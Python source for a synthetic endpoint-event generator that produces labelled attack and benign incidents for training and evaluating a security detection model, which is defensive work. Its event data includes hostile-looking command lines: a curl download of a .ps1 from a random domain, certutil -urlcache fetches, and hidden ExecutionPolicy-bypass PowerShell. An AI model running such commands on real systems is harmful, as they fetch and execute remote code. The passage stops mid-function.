"""Synthetic endpoint event generator for SentinelLLM (Person 2).

Emits events.jsonl + incidents.jsonl conforming to ml/schema/*.v1.json so the
AI/ML pipeline can be built, tested and evaluated before Person 1's collector
exists. Stdlib only, fully deterministic for a given --seed.

Design notes
------------
* Every malicious family has HARD-NEGATIVE benign counterparts that fire the
  same rules (signed updater staging in Temp, a genuine Cloudflare CAPTCHA, a
  dev toolchain running unsigned binaries from Temp). Without these the
  false-positive rate in the proposal's section 10 is meaningless.
* Stage dropout and timing jitter stop the attack families from being
  near-duplicates, which is the leakage failure mode in the guide's section 14.
* scenario_family is the split grouping key. Variants stay inside one family.

Usage
    python data_synthetic/generate.py --n-incidents 400 --seed 7 --out data_synthetic/v1
"""
from __future__ import annotations

import argparse
import hashlib
import json
import math
import random
from collections import Counter
from datetime import datetime, timedelta, timezone
from pathlib import Path

GENERATOR_VERSION = "0.3.0"
SCHEMA_VERSION = "1.0.0"

TRUSTED_SIGNERS = ["Microsoft Corporation", "Google LLC", "Mozilla Corporation",
                   "Adobe Inc.", "JetBrains s.r.o.", "Python Software Foundation"]
COMMON_DOMAINS = ["windowsupdate.com", "googleapis.com", "github.com", "pypi.org",
                  "office.com", "mozilla.org", "cloudflare.com"]
BENIGN_PROCS = ["chrome.exe", "msedge.exe", "explorer.exe", "svchost.exe",
                "WINWORD.EXE", "EXCEL.EXE", "Teams.exe", "code.exe"]

# Attackers host payloads and C2 on reputable infrastructure. A detector that
# leans on domain rarity will miss these entirely, which is the point of
# including them: they make network features informative but not decisive.
LEGIT_HOSTING = ["raw.githubusercontent.com", "cdn.discordapp.com", "pastebin.com",
                 "drive.google.com", "objects.githubusercontent.com", "transfer.sh",
                 "api.telegram.org", "s3.amazonaws.com"]

# Certificates that are valid but not on the trusted-publisher list, plus
# plausible stolen-certificate signers for the hardest malicious variants.
UNTRUSTED_SIGNERS = ["Shenzhen Technology Co. Ltd", "Bright Future Software",
                     "NovaSoft LLC", "Digital Tools Ltd"]

# Rule stubs. Person 1 owns the final definitions; these IDs are the contract.
RULES = {
    "R001": "hidden PowerShell window",
    "R002": "PowerShell ExecutionPolicy bypass",
    "R003": "unsigned executable launched from Temp",
    "R004": "remote script download by interpreter",
    "R005": "password-protected archive extracted to Temp",
    "R006": "browser credential store accessed by untrusted process",
    "R007": "rare outbound destination shortly after execution",
    "R008": "persistence written to a Run key",
    "R009": "scheduled task created by a non-system process",
    "R010": "WMI event subscription created",
    "R011": "clipboard write followed by interpreter execution (ClickFix)",
    "R012": "LOLBin performing network activity",
}


def rand_hex(rng: random.Random, n: int = 64) -> str:
    return hashlib.sha256(str(rng.random()).encode()).hexdigest()[:n]


def entropy(s: str) -> float:
    if not s:
        return 0.0
    counts = Counter(s)
    total = len(s)
    return -sum((c / total) * math.log2(c / total) for c in counts.values())


def rand_name(rng: random.Random, style: str) -> str:
    if style == "random":
        return "".join(rng.choice("abcdefghijklmnopqrstuvwxyz0123456789") for _ in range(rng.randint(8, 14)))
    if style == "masquerade":
        return rng.choice(["svchost", "chrome_update", "AdobeReaderSetup", "WindowsSecurity", "teams_installer"])
    return rng.choice(["setup", "installer", "build", "tool", "helper", "update"])


def rare_domain(rng: random.Random) -> str:
    tld = rng.choice([".top", ".xyz", ".ru", ".cc", ".info", ".shop"])
    return rand_name(rng, "random")[:rng.randint(6, 11)] + tld


class Builder:
    """Accumulates events for one incident, assigning IDs and timestamps."""

    def __init__(self, rng: random.Random, incident_id: str, start: datetime,
                 counter: list[int], ambiguity: float = 0.5):
        self.rng = rng
        self.ambiguity = ambiguity
        self.incident_id = incident_id
        self.t = start
        self.counter = counter
        self.noise_budget = int(rng.gauss(22, 7))
        self.noise_budget = max(4, min(45, self.noise_budget))
        # CONFOUND 2: only attacks got multi-hour dwell times, so duration alone
        # separated the classes. Long sessions are assigned label-independently -
        # an office day spans hours just as a slow intrusion does.
        self.time_scale = rng.choice([1.0, 1.0, 1.0, rng.uniform(20, 200), rng.uniform(200, 1200)])
        self.events: list[dict] = []
        self.rule_hits: set[str] = set()
        self.stages: set[str] = set()
        self.host = f"HOST-{rng.randint(1, 6):02d}"

    def advance(self, lo: float, hi: float) -> None:
        self.t += timedelta(seconds=self.rng.uniform(lo, hi) * getattr(self, "time_scale", 1.0))

    def roll(self, p: float) -> bool:
        """True with probability p, scaled by this dataset's ambiguity setting."""
        return self.rng.random() < (p * self.ambiguity)

    def next_noise_chunk(self) -> int:
        """Spend part of this incident's label-independent noise budget."""
        if self.noise_budget <= 0:
            return 0
        take = min(self.noise_budget, self.rng.randint(0, max(1, self.noise_budget // 2 + 1)))
        self.noise_budget -= take
        return take

    def drain_noise(self) -> None:
        """Emit whatever noise budget is left, so totals match across families."""
        if self.noise_budget > 0:
            self.noise(self.noise_budget)
            self.noise_budget = 0

    def add(self, event_type: str, rules: list[str] | None = None,
            stage: str | None = None, mitre: list[str] | None = None, **fields) -> str:
        self.counter[0] += 1
        eid = f"E{self.counter[0]:05d}"
        ev = {
            "schema_version": SCHEMA_VERSION,
            "event_id": eid,
            "incident_id": self.incident_id,
            "timestamp": self.t.isoformat(timespec="milliseconds").replace("+00:00", "Z"),
            "host": self.host,
            "event_type": event_type,
        }
        for k, v in fields.items():
            if v is not None:
                ev[k] = v
        if rules:
            ev["rule_hits"] = sorted(rules)
            self.rule_hits.update(rules)
        if mitre:
            ev["mitre_techniques"] = mitre
        if stage:
            self.stages.add(stage)
        self.events.append(ev)
        return eid

    # --- reusable event fragments -------------------------------------------------
    def proc(self, name, path_category, signed, signer, cmdline, depth, pid=None):
        return {
            "pid": pid or self.rng.randint(1000, 60000),
            "ppid": self.rng.randint(400, 999),
            "name": name,
            "path": f"C:\\{path_category}\\{name}",
            "path_category": path_category,
            "cmdline": cmdline,
            "cmdline_len": len(cmdline),
            "signed": signed,
            "signer": signer,
            "signer_trusted": bool(signed and signer in TRUSTED_SIGNERS),
            "tree_depth": depth,
            "integrity_level": self.rng.choice(["medium", "medium", "high"]),
        }

    def artifact(self, name, ext, path_category, signed, signer, prevalence, first_seen=None, encrypted=False):
        base = f"{name}.{ext}"
        return {
            "path": f"C:\\{path_category}\\{base}",
            "path_category": path_category,
            "name_entropy": round(entropy(name), 3),
            "extension": ext,
            "sha256": rand_hex(self.rng),
            "size_bytes": self.rng.randint(40_000, 9_000_000),
            "signed": signed,
            "signer_trusted": bool(signed and signer in TRUSTED_SIGNERS),
            "first_seen_hours": first_seen,
            "prevalence": prevalence,
            "archive_encrypted": encrypted,
        }

    def net(self, domain, rarity, reputation, bytes_out, age=None):
        return {
            "domain": domain,
            "port": 443,
            "protocol": "https",
            "domain_age_days": age,
            "domain_rarity": round(rarity, 3),
            "bytes_out": bytes_out,
            "reputation": reputation,
        }

    def noise(self, n: int | None = None) -> None:
        """Ambient benign activity so no incident is a bare attack chain.

        n is ignored by default: the volume comes from self.noise_budget, which is
        drawn per incident from one label-independent distribution. Hard-coding
        per-family ranges made event count a giveaway for the label - the model
        learned the generator, not the attack.
        """
        n = self.next_noise_chunk() if n is None else n
        for _ in range(n):
            self.advance(0.5, 40)
            name = self.rng.choice(BENIGN_PROCS)
            signer = self.rng.choice(TRUSTED_SIGNERS)
            if self.rng.random() < 0.55:
                self.add("process_create",
                         process=self.proc(name, self.rng.choice(["program_files", "system32"]),
                                           True, signer, f"\"C:\\Program Files\\{name}\"", self.rng.randint(1, 3)))
            else:
                self.add("network_connect",
                         process=self.proc(name, "program_files", True, signer, name, 2),
                         network=self.net(self.rng.choice(COMMON_DOMAINS), self.rng.uniform(0.0, 0.12),
                                          "benign", self.rng.randint(500, 40_000), self.rng.randint(800, 6000)))


# ---------------------------------------------------------------------------
# Malicious families
# ---------------------------------------------------------------------------

def clickfix_infostealer(b: Builder) -> dict:
    """Proposal section 7 in full: visual deception -> hidden PS -> remote script
    -> encrypted archive -> unsigned Temp payload -> credential access -> C2.
    Stages drop out probabilistically so variants are not near-duplicates."""
    rng = b.rng
    # Evasion draws. Each one removes or weakens a signal a detector would
    # otherwise rely on, so malicious incidents overlap benign ones.
    ev = {
        "signed_payload": b.roll(0.45),      # valid cert -> R003 does not fire
        "legit_infra": b.roll(0.55),         # C2 on reputable hosting -> low rarity
        "slow": b.roll(0.45),                # hours between stages -> kills timing
        "low_volume_exfil": b.roll(0.5),     # small egress -> looks like telemetry
        "quiet": b.roll(0.4),                # no AV/YARA corroboration at all
    }
    if ev["slow"]:
        b.time_scale = max(b.time_scale, rng.uniform(40, 900))
    b.noise()

    # Stage 1: deceptive page + clipboard poisoning
    if rng.random() < 0.9:
        b.advance(2, 30)
        b.add("screenshot_capture", stage="visual_deception", mitre=["T1204.001"],
              visual={"screenshot_id": f"SS-{rand_hex(rng, 10)}",
                      "url_domain": rare_domain(rng),
                      "page_text_excerpt": rng.choice([
                          "Verify you are human - press Windows+R and paste the code",
                          "Cloudflare checkpoint failed. Run the verification command to continue.",
                          "To prove you are not a robot, open the Run dialog and paste.",
                      ]),
                      "capture_trigger": "high_risk_navigation",
                      "input_fields_redacted": True})
        b.advance(1, 12)
        b.add("clipboard_write", rules=["R011"], stage="visual_deception",
              process=b.proc("chrome.exe", "program_files", True, "Google LLC", "chrome.exe", 2))

    # Stage 2: hidden PowerShell
    b.advance(3, 45)
    bypass = rng.random() < 0.8
    cmd = ("powershell.exe -w hidden " + ("-ExecutionPolicy Bypass " if bypass else "")
           + f"-enc {rand_hex(rng, rng.randint(40, 90))}")
    rules = ["R001"] + (["R002"] if bypass else [])
    b.add("process_create", rules=rules, stage="script_execution", mitre=["T1059.001"],
          process=b.proc("powershell.exe", "system32", True, "Microsoft Corporation", cmd, rng.randint(2, 4)))

    # Stage 3: remote payload download
    b.advance(1, 20)
    if ev["legit_infra"]:
        c2 = rng.choice(LEGIT_HOSTING)
        c2_rarity, c2_rep, c2_age = rng.uniform(0.0, 0.25), "benign", rng.randint(1500, 7000)
    else:
        c2 = rare_domain(rng)
        c2_rarity, c2_rep = rng.uniform(0.82, 1.0), rng.choice(["unknown", "suspicious"])
        c2_age = rng.randint(0, 30)
    b.add("network_connect", rules=["R004"], stage="remote_download", mitre=["T1105"],
          process=b.proc("powershell.exe", "system32", True, "Microsoft Corporation", cmd, 3),
          network=b.net(c2, c2_rarity, c2_rep, rng.randint(900, 7000), c2_age))

    # Stage 4: encrypted archive staging (optional)
    if rng.random() < 0.65:
        b.advance(2, 25)
        b.add("file_create", rules=["R005"], stage="archive_staging", mitre=["T1027"],
              file=b.artifact(rand_name(rng, "random"), "zip", "user_temp", False, None, "unknown",
                              first_seen=None, encrypted=True))

    # Stage 5: unsigned payload from Temp
    b.advance(1, 18)
    payload = rand_name(rng, rng.choice(["random", "masquerade", "masquerade", "plain"]))
    if ev["signed_payload"]:
        # Stolen or cheaply-obtained certificate: signed, so the naive
        # "unsigned executable from Temp" rule stays silent.
        stolen = rng.random() < 0.3
        p_signed, p_signer = True, (rng.choice(TRUSTED_SIGNERS) if stolen
                                    else rng.choice(UNTRUSTED_SIGNERS))
        p_rules = []
    else:
        p_signed, p_signer, p_rules = False, None, ["R003"]
    p_dir = rng.choice(["user_temp", "user_temp", "user_appdata", "user_downloads"])
    b.add("file_create", stage="payload_execution",
          file=b.artifact(payload, "exe", p_dir, p_signed, p_signer,
                          rng.choice(["unknown", "unknown", "rare"]), first_seen=None))
    b.advance(0.5, 8)
    b.add("process_create", rules=p_rules, stage="payload_execution", mitre=["T1204.002"],
          process=b.proc(f"{payload}.exe", p_dir, p_signed, p_signer, f"C:\\{p_dir}\\{payload}.exe", 4))

    # Stage 6: credential/session theft (metadata only)
    if rng.random() < 0.85:
        b.advance(1, 15)
        for store in rng.sample(["chromium_cookies", "chromium_login_data", "dpapi_masterkey"], rng.randint(1, 3)):
            b.advance(0.2, 3)
            b.add("browser_credential_access",
                  rules=[] if p_signed and p_signer in TRUSTED_SIGNERS else ["R006"],
                  stage="credential_access", mitre=["T1555.003"],
                  process=b.proc(f"{payload}.exe", p_dir, p_signed, p_signer, payload, 4),
                  credential_target={"store": store, "browser": rng.choice(["chrome", "edge", "firefox"]),
                                     "access_type": rng.choice(["read", "copy", "open_handle"]),
                                     "secrets_collected": False})

    # Stage 7: exfiltration
    if rng.random() < 0.8:
        b.advance(1, 25)
        dest = c2 if rng.random() < 0.6 else (rng.choice(LEGIT_HOSTING) if ev["legit_infra"]
                                             else rare_domain(rng))
        b.add("network_connect",
              rules=[] if ev["legit_infra"] else ["R007"],
              stage="exfiltration", mitre=["T1041"],
              process=b.proc(f"{payload}.exe", p_dir, p_signed, p_signer, payload, 4),
              network=b.net(dest, c2_rarity if ev["legit_infra"] else rng.uniform(0.85, 1.0),
                            c2_rep if ev["legit_infra"] else rng.choice(["unknown", "suspicious", "malicious"]),
                            rng.randint(1500, 30_000) if ev["low_volume_exfil"]
                            else rng.randint(40_000, 4_000_000),
                            c2_age))

    # Stage 8: persistence (optional)
    if rng.random() < 0.45:
        b.advance(2, 30)
        b.add("registry_set", rules=["R008"], stage="persistence", mitre=["T1547.001"],
              process=b.proc(f"{payload}.exe", p_dir, p_signed, p_signer, payload, 4),
              registry={"key": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                        "value_name": payload, "is_persistence_location": True, "value_redacted": True})

    # Independent corroboration, sometimes late, sometimes absent
    if not ev["quiet"] and rng.random() < 0.45:
        b.advance(10, 400)
        b.add("defender_alert", stage=None,
              detection={"source": rng.choice(["defender", "yara"]), "verdict": "malicious",
                         "signature_name": rng.choice(["Trojan:Win32/Stealer", "YARA:Infostealer_Generic"]),
                         "confidence": round(rng.uniform(0.7, 0.99), 2)})

    b.noise()
    return {"label": "malicious", "variant": "full_chain" if len(b.stages) >= 5 else "partial_chain"}


def staged_download(b: Builder) -> dict:
    """Same payload chain WITHOUT the visual stage - isolates the VLM's contribution."""
    rng = b.rng
    b.noise()
    b.advance(5, 60)
    cmd = f"cmd.exe /c curl -s http://{rare_domain(rng)}/a.ps1 -o %TEMP%\\a.ps1"
    b.add("process_create", rules=["R004", "R012"], stage="remote_download", mitre=["T1105"],
          process=b.proc("cmd.exe", "system32", True, "Microsoft Corporation", cmd, rng.randint(2, 3)))
    b.advance(1, 15)
    payload = rand_name(rng, "random")
    b.add("file_create", stage="payload_execution",
          file=b.artifact(payload, "exe", "user_temp", False, None, "unknown", first_seen=None))
    b.advance(0.5, 10)
    b.add("process_create", rules=["R003"], stage="payload_execution", mitre=["T1204.002"],
          process=b.proc(f"{payload}.exe", "user_temp", False, None, payload, 4))
    if rng.random() < 0.7:
        b.advance(1, 20)
        b.add("network_connect", rules=["R007"], stage="exfiltration", mitre=["T1041"],
              process=b.proc(f"{payload}.exe", "user_temp", False, None, payload, 4),
              network=b.net(rare_domain(rng), rng.uniform(0.8, 1.0), "unknown",
                            rng.randint(20_000, 900_000), rng.randint(1, 60)))
    b.noise()
    return {"label": "malicious", "variant": "no_visual_stage"}


def persistence_only(b: Builder) -> dict:
    """Quiet persistence with no download and no credential access - tests whether
    the system over-relies on the network/credential signals."""
    rng = b.rng
    b.noise()
    b.advance(5, 90)
    name = rand_name(rng, "masquerade")
    b.add("file_create", stage="payload_execution",
          file=b.artifact(name, "exe", "user_appdata", False, None, "rare", first_seen=None))
    mech = rng.choice(["run_key", "scheduled_task", "wmi", "service"])
    b.advance(1, 30)
    if mech == "run_key":
        b.add("registry_set", rules=["R008"], stage="persistence", mitre=["T1547.001"],
              process=b.proc(f"{name}.exe", "user_appdata", False, None, name, 3),
              registry={"key": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                        "value_name": name, "is_persistence_location": True, "value_redacted": True})
    elif mech == "scheduled_task":
        b.add("scheduled_task_create", rules=["R009"], stage="persistence", mitre=["T1053.005"],
              process=b.proc(f"{name}.exe", "user_appdata", False, None, name, 3))
    elif mech == "wmi":
        b.add("wmi_subscription", rules=["R010"], stage="persistence", mitre=["T1546.003"],
              process=b.proc(f"{name}.exe", "user_appdata", False, None, name, 3))
    else:
        b.add("service_create", rules=["R009"], stage="persistence", mitre=["T1543.003"],
              process=b.proc(f"{name}.exe", "user_appdata", False, None, name, 3))
    b.noise()
    return {"label": "malicious", "variant": mech}


# ---------------------------------------------------------------------------
# Benign families. The *_hard ones deliberately fire attack rules.
# ---------------------------------------------------------------------------

def benign_office(b: Builder) -> dict:
    b.noise(b.rng.randint(12, 30))
    return {"label": "benign", "variant": "office_browsing", "hard": False}


def benign_software_update_hard(b: Builder) -> dict:
    """HARD NEGATIVE: a real updater downloads a remote payload and executes from
    Temp. Fires R004 and nearly R003. Separated only by trusted signature,
    common-domain reputation and the absence of credential access."""
    rng = b.rng
    b.noise()
    vendor = rng.choice(TRUSTED_SIGNERS)
    updater = rng.choice(["GoogleUpdate", "AdobeARMHelper", "MicrosoftEdgeUpdate", "jetbrains-toolbox-update"])
    b.advance(5, 120)
    b.add("process_create",
          process=b.proc(f"{updater}.exe", "program_files", True, vendor, f"{updater}.exe /silent /install", 2))
    b.advance(1, 20)
    b.add("network_connect", rules=["R004"], stage=None,
          process=b.proc(f"{updater}.exe", "program_files", True, vendor, updater, 2),
          network=b.net(rng.choice(COMMON_DOMAINS), rng.uniform(0.0, 0.1), "benign",
                        rng.randint(5000, 60_000), rng.randint(2000, 9000)))
    stage_name = rand_name(rng, "plain") + "_setup"
    b.advance(2, 40)
    b.add("file_create",
          file=b.artifact(stage_name, "exe", "user_temp", True, vendor, "common", first_seen=None))
    b.advance(1, 15)
    # signed Temp execution: trips the temp-execution rule in its naive form
    b.add("process_create", rules=["R003"] if rng.random() < 0.5 else [],
          process=b.proc(f"{stage_name}.exe", "user_temp", True, vendor, stage_name, 3))
    b.noise()
    return {"label": "benign", "variant": "signed_updater_temp_staging", "hard": True}


def benign_dev_toolchain_hard(b: Builder) -> dict:
    """HARD NEGATIVE: developer machine - unsigned freshly built binaries run from
    Temp/build dirs, PowerShell scripts, GitHub/PyPI downloads. Fires R003/R004.
    Distinguished by breadth (many short-lived procs), no credential access, no
    rare domains, and repetitive build cadence."""
    rng = b.rng
    b.noise()
    for _ in range(rng.randint(3, 8)):
        b.advance(1, 25)
        tool = rand_name(rng, "plain")
        b.add("file_create",
              file=b.artifact(tool, rng.choice(["exe", "dll"]), "user_temp", False, None, "unknown", first_seen=None))
        b.advance(0.3, 6)
        b.add("process_create", rules=["R003"],
              process=b.proc(f"{tool}.exe", "user_temp", False, None, f"{tool}.exe --test", rng.randint(2, 4)))
    if rng.random() < 0.7:
        b.advance(2, 30)
        cmd = "powershell.exe -ExecutionPolicy Bypass -File .\\scripts\\build.ps1"
        b.add("process_create", rules=["R002"],
              process=b.proc("powershell.exe", "system32", True, "Microsoft Corporation", cmd, 2))
        b.advance(1, 20)
        b.add("network_connect", rules=["R004"],
              process=b.proc("powershell.exe", "system32", True, "Microsoft Corporation", cmd, 2),
              network=b.net(rng.choice(["github.com", "pypi.org", "registry.npmjs.org"]),
                            rng.uniform(0.0, 0.15), "benign", rng.randint(2000, 80_000), rng.randint(3000, 9000)))
    b.noise()
    return {"label": "benign", "variant": "unsigned_builds_in_temp", "hard": True}


def benign_real_captcha_hard(b: Builder) -> dict:
    """HARD NEGATIVE for the VLM: a genuine Cloudflare/hCaptcha challenge, with no
    clipboard poisoning and no subsequent interpreter execution. Visual evidence
    alone must not be sufficient (guide section 10)."""
    rng = b.rng
    b.noise()
    b.advance(3, 60)
    b.add("screenshot_capture",
          visual={"screenshot_id": f"SS-{rand_hex(rng, 10)}",
                  "url_domain": rng.choice(["cloudflare.com", "github.com", "stackoverflow.com", "office.com"]),
                  "page_text_excerpt": rng.choice([
                      "Verify you are human by completing the challenge below",
                      "Checking your browser before accessing the site",
                      "Select all squares containing a bicycle",
                  ]),
                  "capture_trigger": "high_risk_navigation",
                  "input_fields_redacted": True})
    b.noise()
    return {"label": "benign", "variant": "genuine_verification_page", "hard": True}


def benign_installer_hard(b: Builder) -> dict:
    """HARD NEGATIVE: user downloads and runs an unsigned installer from Downloads
    - new, unsigned, unknown prevalence, writes a Run key. Fires R008."""
    rng = b.rng
    b.noise()
    name = rand_name(rng, "plain") + "-setup"
    b.advance(10, 180)
    b.add("file_create",
          file=b.artifact(name, "exe", "user_downloads", False, None, "rare", first_seen=None))
    b.advance(5, 90)
    b.add("process_create",
          process=b.proc(f"{name}.exe", "user_downloads", False, None, f"{name}.exe", 2))
    if rng.random() < 0.6:
        b.advance(2, 40)
        b.add("registry_set", rules=["R008"],
              process=b.proc(f"{name}.exe", "user_downloads", False, None, name, 2),
              registry={"key": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                        "value_name": name, "is_persistence_location": True, "value_redacted": True})
    b.noise()
    return {"label": "benign", "variant": "unsigned_user_installer", "hard": True}


def benign_admin_scripting_hard(b: Builder) -> dict:
    """HARD NEGATIVE: sysadmin running legitimate hidden PowerShell automation.
    Fires R001/R002 - the two highest-weight execution rules in proposal section 8."""
    rng = b.rng
    b.noise()
    b.advance(5, 100)
    cmd = ("powershell.exe -w hidden -ExecutionPolicy Bypass -File "
           "\\\\fileserver\\scripts\\inventory.ps1")
    b.add("process_create", rules=["R001", "R002"],
          process=b.proc("powershell.exe", "system32", True, "Microsoft Corporation", cmd, 1))
    b.advance(1, 30)
    b.add("scheduled_task_create", rules=["R009"],
          process=b.proc("powershell.exe", "system32", True, "Microsoft Corporation", cmd, 1))
    b.noise()
    return {"label": "benign", "variant": "legitimate_hidden_automation", "hard": True}


def suspicious_recon(b: Builder) -> dict:
    """Genuinely ambiguous: LOLBin discovery activity with no payload. Labelled
    'suspicious' - the class your risk bands must place in Observe/Suspicious,
    not Critical."""
    rng = b.rng
    b.noise()
    for tool in rng.sample(["whoami.exe", "net.exe", "nltest.exe", "systeminfo.exe", "wmic.exe"], rng.randint(2, 4)):
        b.advance(1, 20)
        b.add("process_create", rules=["R012"] if rng.random() < 0.3 else [],
              process=b.proc(tool, "system32", True, "Microsoft Corporation", f"{tool} /all", rng.randint(2, 4)),
              mitre=["T1082"])
    b.noise()
    return {"label": "suspicious", "variant": "lolbin_discovery", "hard": False}



def benign_password_manager_hard(b: Builder) -> dict:
    """HARD NEGATIVE: a portable, unsigned password manager legitimately reads the
    browser credential store to import logins. Fires R006 - the single
    highest-weighted rule in proposal s8 (+20). Separated from theft only by the
    absence of outbound traffic afterwards."""
    rng = b.rng
    b.noise()
    tool = rng.choice(["KeePass", "KeePassXC-portable", "BitwardenImporter", "pwsafe"])
    b.advance(10, 200)
    b.add("process_create",
          process=b.proc(f"{tool}.exe", "user_downloads", False, None, f"{tool}.exe --import", 2))
    for store in rng.sample(["chromium_login_data", "chromium_cookies", "firefox_logins"], rng.randint(1, 3)):
        b.advance(0.5, 10)
        b.add("browser_credential_access", rules=["R006"], mitre=["T1555.003"],
              process=b.proc(f"{tool}.exe", "user_downloads", False, None, tool, 2),
              credential_target={"store": store, "browser": rng.choice(["chrome", "edge", "firefox"]),
                                 "access_type": "read", "secrets_collected": False})
    # Benign tools usually stay local; sometimes they sync.
    if rng.random() < 0.3:
        b.advance(5, 60)
        b.add("network_connect",
              process=b.proc(f"{tool}.exe", "user_downloads", False, None, tool, 2),
              network=b.net("vault.bitwarden.com", rng.uniform(0.2, 0.5), "benign",
                            rng.randint(5_000, 120_000), rng.randint(1000, 4000)))
    b.noise()
    return {"label": "benign", "variant": "portable_password_manager_import", "hard": True}


def benign_cloud_sync_hard(b: Builder) -> dict:
    """HARD NEGATIVE: backup/sync client pushes gigabytes to a self-hosted or
    niche endpoint. High egress volume + elevated domain rarity + fast
    exec->egress - the exfiltration feature signature, with benign intent."""
    rng = b.rng
    b.noise()
    tool = rng.choice(["rclone", "duplicati", "restic", "syncthing", "backblaze"])
    signed = rng.random() < 0.5
    signer = rng.choice(TRUSTED_SIGNERS) if signed else None
    b.advance(5, 120)
    b.add("process_create",
          process=b.proc(f"{tool}.exe", rng.choice(["program_files", "user_appdata"]),
                         signed, signer, f"{tool}.exe sync --remote backup", 2))
    for _ in range(rng.randint(2, 5)):
        b.advance(0.5, 20)
        b.add("network_connect",
              rules=["R007"] if rng.random() < 0.35 else [],
              process=b.proc(f"{tool}.exe", "program_files", signed, signer, tool, 2),
              network=b.net(rng.choice(["backup.myserver.net", "s3.amazonaws.com",
                                        rare_domain(rng), "storage.backblazeb2.com"]),
                            rng.uniform(0.3, 0.9), rng.choice(["unknown", "benign"]),
                            rng.randint(500_000, 8_000_000), rng.randint(200, 5000)))
    b.noise()
    return {"label": "benign", "variant": "backup_sync_high_egress", "hard": True}


def benign_pua_flagged_hard(b: Builder) -> dict:
    """HARD NEGATIVE: antivirus flags a benign tool as PUA (keygen-adjacent
    utility, aggressive installer, system optimiser). Makes the independent
    corroboration feature imperfect - at +40 it is the heaviest signal in
    proposal s8, and treating it as ground truth is a mistake."""
    rng = b.rng
    b.noise()
    tool = rng.choice(["WinRAR-patch", "DriverBooster", "CCleanerPro", "ActivationHelper"])
    b.advance(10, 150)
    b.add("file_create",
          file=b.artifact(tool, "exe", "user_downloads", False, None, "rare", first_seen=None))
    b.advance(2, 40)
    b.add("process_create", rules=["R003"] if rng.random() < 0.4 else [],
          process=b.proc(f"{tool}.exe", rng.choice(["user_downloads", "user_temp"]),
                         False, None, tool, 2))
    b.advance(5, 200)
    b.add("defender_alert",
          detection={"source": rng.choice(["defender", "reputation_feed"]),
                     "verdict": rng.choice(["suspicious", "malicious"]),
                     "signature_name": rng.choice(["PUA:Win32/Presenter", "PUA:Win32/Patcher",
                                                   "HackTool:Win32/Keygen"]),
                     "confidence": round(rng.uniform(0.4, 0.8), 2)})
    b.noise()
    return {"label": "benign", "variant": "pua_false_alarm", "hard": True}


def lotl_credential_theft(b: Builder) -> dict:
    """MALICIOUS, hardest variant: living-off-the-land. Only signed Microsoft
    binaries, payload staged via certutil/bitsadmin from reputable hosting, slow
    dwell time, small exfil. Almost every signal the other families provide is
    absent - this is the family that should expose over-fitting."""
    rng = b.rng
    b.time_scale = max(b.time_scale, rng.uniform(100, 1500))
    b.noise()
    lolbin = rng.choice(["certutil.exe", "bitsadmin.exe", "mshta.exe", "rundll32.exe"])
    host = rng.choice(LEGIT_HOSTING)
    b.advance(5, 60)
    cmd = f"{lolbin} -urlcache -split -f https://{host}/{rand_name(rng, 'plain')}.txt"
    b.add("process_create",
          rules=["R012"] if rng.random() < 0.5 else [],
          stage="remote_download", mitre=["T1105", "T1218"],
          process=b.proc(lolbin, "system32", True, "Microsoft Corporation", cmd, rng.randint(2, 4)))
    b.advance(1, 30)
    b.add("network_connect", rules=["R004"] if rng.random() < 0.5 else [],
          stage="remote_download", mitre=["T1105"],
          process=b.proc(lolbin, "system32", True, "Microsoft Corporation", cmd, 3),
          network=b.net(host, rng.uniform(0.0, 0.2), "benign",
                        rng.randint(2000, 40_000), rng.randint(1500, 7000)))
    # Credential access through a signed, trusted binary: R006 stays silent.
    b.advance(2, 40)
    for store in rng.sample(["chromium_login_data", "dpapi_masterkey"], rng.randint(1, 2)):
        b.advance(0.5, 15)
        b.add("browser_credential_access", stage="credential_access", mitre=["T1555.003"],
              process=b.proc(rng.choice(["rundll32.exe", "powershell.exe"]), "system32",
                             True, "Microsoft Corporation", "rundll32.exe shell32.dll,#61", 3),
              credential_target={"store": store, "browser": "chrome",
                                 "access_type": "open_handle", "secrets_collected": False})
    if rng.random() < 0.6:
        b.advance(5, 120)
        b.add("network_connect", stage="exfiltration", mitre=["T1041"],
              process=b.proc("powershell.exe", "system32", True, "Microsoft Corporation", "powershell", 3),
              network=b.net(rng.choice(LEGIT_HOSTING), rng.uniform(0.0, 0.2), "benign",
                            rng.randint(3000, 50_000), rng.randint(1500, 7000)))
    if rng.random() < 0.4:
        b.advance(10, 200)
        b.add("wmi_subscription", rules=["R010"], stage="persistence", mitre=["T1546.003"],
              process=b.proc("wmiprvse.exe", "system32", True, "Microsoft Corporation", "wmiprvse", 2))
    b.noise()
    return {"label": "malicious", "variant": "living_off_the_land"}


FAMILIES = {
    "clickfix_infostealer": clickfix_infostealer,
    "staged_download": staged_download,
    "persistence_only": persistence_only,
    "lotl_credential_theft": lotl_credential_theft,
    "lolbin_recon": suspicious_recon,
    "benign_office": benign_office,
    "benign_software_update": benign_software_update_hard,
    "benign_dev_toolchain": benign_dev_toolchain_hard,
    "benign_real_captcha": benign_real_captcha_hard,
    "benign_installer": benign_installer_hard,
    "benign_admin_scripting": benign_admin_scripting_hard,
    "benign_password_manager": benign_password_manager_hard,
    "benign_cloud_sync": benign_cloud_sync_hard,
    "benign_pua_flagged": benign_pua_flagged_hard,
}

# Deliberately imbalanced toward benign, as a real endpoint is.
MIX = {
    "clickfix_infostealer": 0.12,
    "staged_download": 0.07,
    "persistence_only": 0.05,
    "lotl_credential_theft": 0.06,
    "lolbin_recon": 0.06,
    "benign_office": 0.17,
    "benign_software_update": 0.08,
    "benign_dev_toolchain": 0.08,
    "benign_real_captcha": 0.06,
    "benign_installer": 0.06,
    "benign_admin_scripting": 0.05,
    "benign_password_manager": 0.05,
    "benign_cloud_sync": 0.05,
    "benign_pua_flagged": 0.04,
}


def generate(n_incidents: int, seed: int, out_dir: Path,
             ambiguity: float = 1.0) -> dict:
    rng = random.Random(seed)
    counter = [0]
    base_time = datetime(2026, 3, 2, 9, 0, tzinfo=timezone.utc)

    names = list(MIX)
    weights = [MIX[n] for n in names]
    events_out, incidents_out = [], []

    for i in range(1, n_incidents + 1):
        family = rng.choices(names, weights=weights, k=1)[0]
        incident_id = f"INC-{i:04d}"
        start = base_time + timedelta(hours=rng.uniform(0, 24 * 45))
        b = Builder(rng, incident_id, start, counter, ambiguity=ambiguity)
        meta = FAMILIES[family](b)
        b.drain_noise()

        incidents_out.append({
